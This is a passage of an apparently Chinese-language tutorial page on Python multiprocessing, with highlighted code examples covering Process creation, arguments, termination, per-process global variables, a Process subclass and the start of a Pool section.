data-num=\"11\"></td><td><pre>- 实现多任务的方式：</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  - 多进程模式；</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  - 多线程模式；</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  - 协程。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  进程  >  线程  >  协程</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 进程创建</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务1.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务2.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span>os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\"># 子进程</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*****************'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"2-process02\"><a class=\"anchor\" href=\"#2-process02\">#</a> 2. process02</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>生活中，你可能一边听歌，一边写作业；一边上网，一边吃饭。。。这些都是生活中的多任务场景。电脑也可以执行多任务，比如你可以同时打开浏览器上网，听音乐，打开pycharm编写代码...。简单的说**多任务就是同一时间内运行多个程序**</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>- 单核CPU实现多任务原理：操作系统轮流让各个任务交替执行，QQ执行2us，切换到微信，在执行2us，再切换到陌陌，执行2us……。表面是看，每个任务反复执行下去，但是CPU调度执行速度太快了，导致我们感觉就行所有任务都在同时执行一样</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>- 多核CPU实现多任务原理：真正的秉性执行多任务只能在多核CPU上实现，但是由于任务数量远远多于CPU的核心数量，所以，操作西永也会自动把很多任务轮流调度到每个核心上执行</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>- 并发和并行</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  - **并发**：当有多个线程在操作时,如果系统只有一个CPU,则它根本不可能真正同时进行一个以上的线程，它只能把CPU运行时间划分成若干个时间段,再将时间 段分配给各个线程执行，在一个时间段的线程代码运行时，其它线程处于挂起状。.这种方式我们称之为并发(Concurrent)。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  - **并行**：当系统有一个以上CPU时,则线程的操作有可能非并发。当一个CPU执行一个线程时，另一个CPU可以执行另一个线程，两个线程互不抢占CPU资源，可以同时进行，这种方式我们称之为并行(Parallel)。</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>- 实现多任务的方式：</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  - 多进程模式；</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  - 多线程模式；</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  - 协程。</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  进程  >  线程  >  协程</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  from multiprocessing import Process</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  process = Process(target= 函数，name=进程的名字，args=（给函数传递的参数）)</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  process 对象</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  对象调用方法:</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  process.start()    启动进程并执行任务</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  process.run()  只是执行了任务但是没有启动进程</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  terminate()   终止</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\"># 进程创建</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务1.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务2.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'------'</span><span class=\"token punctuation\">,</span> os<span class=\"token punctuation\">.</span>getppid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>number <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getpid<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token comment\"># 子进程</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    p <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务1'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务2'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        number <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">if</span> number <span class=\"token operator\">==</span> <span class=\"token number\">100</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            p<span class=\"token punctuation\">.</span>terminate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            p1<span class=\"token punctuation\">.</span>terminate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'---------------->number:'</span><span class=\"token punctuation\">,</span>number<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'*****************'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"3-process03\"><a class=\"anchor\" href=\"#3-process03\">#</a> 3. process03</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程创建</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> 多进程对于全局变量访问，在每一个全局变量里面都放一个m变量，</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> 保证每个进程访问变量互不干扰。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> m = 1  # 不可变类型</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> list1 = []  # 可变类型</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> 主进程启动子进程，启动之后无法控制是谁先谁后</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">1</span>  <span class=\"token comment\"># 不可变类型</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>list1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 可变类型</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task1</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">global</span> m</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        m <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        list1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'task1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务1.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">task2</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">global</span> m</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        m <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        list1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'task2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'这是任务2.。。。。。。。。。。'</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">,</span> list1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token comment\"># 子进程</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    p <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task1<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务1'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'aa'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    p1 <span class=\"token operator\">=</span> Process<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>task2<span class=\"token punctuation\">,</span> name<span class=\"token operator\">=</span><span class=\"token string\">'任务2'</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'bb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        m <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------->main:'</span><span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"4-process04\"><a class=\"anchor\" href=\"#4-process04\">#</a> 4. process04</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 进程：自定义</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Process</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">MyProcess</span><span class=\"token punctuation\">(</span>Process<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>MyProcess<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        self<span class=\"token punctuation\">.</span>num <span class=\"token operator\">=</span> num</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\"># 重写 run 方法</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        n <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token comment\"># print (' 进程名字：' + self.name)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#123;&#125;--------->自定义进程,n:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            n <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p <span class=\"token operator\">=</span> MyProcess<span class=\"token punctuation\">(</span><span class=\"token string\">'小明'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p1 <span class=\"token operator\">=</span> MyProcess<span class=\"token punctuation\">(</span><span class=\"token string\">'小红'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    p1<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"5-processpool05\"><a class=\"anchor\" href=\"#5-processpool05\">#</a> 5. processpool05</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>当需要创建的子进程数量不多时，可以直接利用multiprocessing中的Process动态成生多个进程，</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>但如果是上百甚至上千个目标，手动的去创建进程的工作量巨大，此时就可以用到multiprocessing模块提供的Pool方法。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>初始化Pool时，可以指定一个最大进程数，当有新的请求提交到Pool中时，如果池还没有满，</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>那么就会创建一个新的进程用来执行该请求；但如果池中的进程数已经达到指定的最大值，那么该请求就会等待，</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>直到池中有进程结束，才会创建新的进程来执行。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>非阻塞式:全部添加到队列中，立刻返回，并没有等待其他的进程完毕，但是回调函数是等待任务完成之后才调用。</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>阻塞式:</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">from</span> multiprocessing <span class=\"token keyword\">import</span> Pool</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td 